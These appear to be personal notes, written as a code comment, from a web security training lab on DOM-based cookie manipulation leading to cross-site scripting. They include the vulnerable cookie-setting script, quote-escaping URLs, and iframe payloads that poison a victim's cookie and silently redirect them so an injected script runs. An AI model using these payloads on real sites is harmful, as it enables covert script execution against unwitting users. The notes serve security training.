/*

inject a cookie that will cause XSS on a different page and call the print() 
function. You will need to use the exploit server 
to direct the victim to the correct pages. 

1) Probably a link when clicked should result in malicious activity

2) View a post reveals:

a last viewed product button

<script>
    document.cookie='lastViewedProduct='+window.location+';SameSite=None; Secure'
</script>

// sets a cookie named 'lastViewedProduct' to the current URL (window.location)
// SameSite=None; Setting it to "None" means that the cookie can be sent in 
   cross-origin requests.

2) we need to set the value of the cookie that can lead to script execution and call print()

3) check the document.cookie from console
document.cookie
"lastViewedProduct=https://0a4d00730395cb40802758d0000b0048.web-security-academy.net/product?productId=11"


<script>
    document.cookie='lastViewedProduct='+window.location+';SameSite=None; Secure'
</script>

4) escaping the single quote of the sink 

//enter this url

https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&'<script>print()</script>;"

"lastViewedProduct=https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&%27javascript:print()"    //document.cookie

this reflects "print()'" on the page so it was processed as non-javascript string



https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&"<script>print()</script>;"

"lastViewedProduct=https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&%22javascript:print()"    //document.cookie

<a href="https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&amp;&quot;javascript:print()">Last viewed product</a>



5) 
<iframe>src="https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&'><script>print()</script>"</iframe>

js gets executed, iframe loads, but to execute the print() we have to 
click the last viewed product button this requires victim interaction, 
this even solved the lab


6) to automate the execution of the stored cookie,

<iframe>src="https://0a480041034df8e480ffadcf0010008f.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.y)this.src='https://0a480041034df8e480ffadcf0010008f.web-security-academy.net';window.x=1;"</iframe>



The original source of the iframe matches the URL of one of the product
pages, except there is a JavaScript payload added to the end. 
When the iframe loads for the first time, the browser temporarily opens the
malicious URL, which is then saved as the value of the lastViewedProduct cookie. 
The onload event handler ensures that the victim is then immediately
redirected to the home page, unaware that this manipulation ever took place. 
While the victim's browser has 

the poisoned cookie saved, loading the home page will cause the payload to execute. 

*/